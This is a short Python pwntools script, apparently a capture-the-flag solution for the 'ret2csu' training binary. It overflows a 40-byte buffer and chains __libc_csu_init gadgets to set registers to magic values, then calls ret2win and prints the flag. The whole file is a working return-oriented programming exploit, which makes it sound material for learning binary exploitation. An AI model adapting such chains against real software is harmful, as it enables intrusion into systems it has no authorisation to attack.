#!/usr/bin/python3
from pwn import process, p64, log

shell = process("./ret2csu")

offset = 40
junk = b"A" * offset

pop_rdi = p64(0x4006a3)
ret2win = p64(0x400510)
pops = p64(0x40069a)
movs = p64(0x400680)
fini = p64(0x4003b0)

payload  = b""
payload += junk
payload += pops + p64(0) + p64(1) + fini + p64(0) + p64(0xcafebabecafebabe) + p64(0xd00df00dd00df00d)
payload += movs + p64(0) * 7
payload += pop_rdi + p64(0xdeadbeefdeadbeef)
payload += ret2win

shell.sendlineafter(b"> ", payload)

flag = shell.recvline_contains(b"ROPE").decode()
log.info(f"Flag: {flag}")
